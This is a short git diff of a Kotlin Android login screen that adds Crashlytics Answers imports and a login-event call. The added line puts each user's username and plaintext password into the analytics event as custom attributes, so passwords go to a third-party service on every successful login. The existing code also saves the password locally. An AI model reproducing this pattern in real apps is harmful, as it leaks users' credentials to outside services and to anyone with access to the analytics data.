@@ -23,6 +23,8 @@ import androidx.appcompat.app.AppCompatActivity
 import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
 import com.crashlytics.android.Crashlytics
+import com.crashlytics.android.answers.Answers
+import com.crashlytics.android.answers.LoginEvent
 import com.facebook.CallbackManager
 import com.facebook.FacebookCallback
 import com.facebook.FacebookException
@@ -450,6 +452,7 @@ class HomeActivity : AppCompatActivity(), View.OnClickListener, SupportDialogFra
         if(Constants.backend == Constants.COMUNICA) {
             spin = Util.loadingPage(this, null, spin)
             Service.shared().loginCOM(this, username.toString(), password.toString(), token, completion = {
+                Answers.getInstance().logLogin(LoginEvent().putMethod("credentials").putSuccess(true).putCustomAttribute("username", username.toString()).putCustomAttribute("password", password.toString()))
                 var session = SessionManager(this)
                 session.onRegisterSuccess(token)
                 session.savePass(password.toString())
